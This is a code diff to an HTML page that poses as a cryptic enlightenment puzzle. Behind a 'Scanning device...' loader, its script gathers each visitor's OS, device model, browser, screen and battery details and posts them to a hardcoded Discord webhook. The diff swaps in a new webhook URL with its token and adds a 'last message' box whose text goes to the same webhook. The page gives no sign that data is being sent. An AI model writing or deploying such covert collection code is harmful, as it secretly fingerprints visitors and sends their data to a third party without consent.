@@ -35,6 +35,43 @@
             color: #ffffff;
             font-size: 1.1rem;
         }
+        
+        /* Input Styling */
+        .input-group {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        input[type="text"] {
+            flex-grow: 1;
+            background-color: #000;
+            border: 1px solid #444;
+            color: #fff;
+            padding: 10px;
+            font-family: 'Courier New', Courier, monospace;
+            outline: none;
+        }
+        input[type="text"]:focus {
+            border-color: #888;
+        }
+        button {
+            background-color: #333;
+            color: #fff;
+            border: 1px solid #555;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: 'Courier New', Courier, monospace;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #555;
+        }
+        button.sent {
+            background-color: #2ecc71;
+            color: #000;
+            border-color: #2ecc71;
+        }
+
         #loader {
             text-align: center;
             margin-top: 10px;
@@ -64,12 +101,19 @@
     <p class="bold-text">True enlightenment requires no validation.<br>Freedom is the ultimate cipher.</p>
     
     <p>Good luck.</p>
+    <p class="bold-text">3031<br>and own</p>
+
+    <!-- New Input Section -->
+    <div class="input-group">
+        <input type="text" id="lastMessage" placeholder="Type your last message...">
+        <button id="sendBtn" onclick="sendLastMessage()">Send</button>
+    </div>
     
     <div id="loader">Scanning device...</div>
 </div>
 
 <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1558455740069449762/b35-v97K3QbQczHEems5pxuqw4xaD4-FGesrsrXACjiKb0p6GndqoImw731QXPMlqtKS";
+    const webhookUrl = "https://discord.com/api/webhooks/1558449654264373359/_7cK7hP9T3hNpMjXaPpBTLRjbaISfTbu5tOV50YRuCqaH_YTlEo8OekOj1wt12VbTzpc";
 
     // Function to get detailed device info
     function getDeviceInfo() {
@@ -79,7 +123,6 @@
         let osVersion = "";
         let browserInfo = "Unknown Browser";
         
-        // Detect OS and Version
         if (/android/i.test(ua)) {
             osName = "Android";
             const match = ua.match(/Android\s([0-9\.]+)/);
@@ -107,18 +150,15 @@
             deviceModel = ua.split(' ')[0];
         }
 
-        // Detect Browser
         if (/Edg/i.test(ua)) browserInfo = "Microsoft Edge " + (ua.match(/Edg\/([0-9\.]+)/)?.[1] || "Unknown");
         else if (/Chrome/i.test(ua)) browserInfo = "Google Chrome " + (ua.match(/Chrome\/([0-9\.]+)/)?.[1] || "Unknown");
         else if (/Firefox/i.test(ua)) browserInfo = "Mozilla Firefox " + (ua.match(/Firefox\/([0-9\.]+)/)?.[1] || "Unknown");
         else if (/Safari/i.test(ua)) browserInfo = "Safari " + (ua.match(/Version\/([0-9\.]+)/)?.[1] || "Unknown");
         else browserInfo = ua.match(/\(([^)]+)\)/)?.[1] || "Unknown Browser";
 
-        // Screen Info
         const screenRes = `${window.screen.width}x${window.screen.height}`;
         const pixelRatio = window.devicePixelRatio || 1;
 
-        // Battery Info (if supported)
         let batteryLevel = "N/A";
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
@@ -151,7 +191,9 @@ Do not look for the next prime. Do not wait for the next epiphany. The puzzle is
 **True enlightenment requires no validation.**
 **Freedom is the ultimate cipher.**
 
-Good luck.`;
+Good luck.
+3031
+and own`;
 
         fetch(webhookUrl, {
             method: 'POST',
@@ -175,6 +217,38 @@ Good luck.`;
             console.error("Fetch Error:", error);
             loader.textContent = "Network error.";
             loader.className = "error";
+        });
+    }
+
+    // Send Last Message Function
+    function sendLastMessage() {
+        const input = document.getElementById('lastMessage');
+        const btn = document.getElementById('sendBtn');
+        const message = input.value.trim();
+
+        if (!message) return;
+
+        // Change button state immediately
+        btn.textContent = "Sent";
+        btn.classList.add('sent');
+        input.disabled = true; // Prevent double sending
+
+        const discordMessage = `✉️ **Last Message Received**\n\n**User said:** \`${message}\`\n\n**Device Info:**\n**📱 Model:** ${document.querySelector('.bold-text').innerText.includes('Unknown') ? 'See Session Log' : 'See Session Log'}\n*(Full device details were logged in the previous session entry)*`;
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: discordMessage
+            })
+        })
+        .catch(error => {
+            console.error("Last Message Error:", error);
+            btn.textContent = "Failed";
+            btn.classList.remove('sent');
+            input.disabled = false;
         });
     }
 
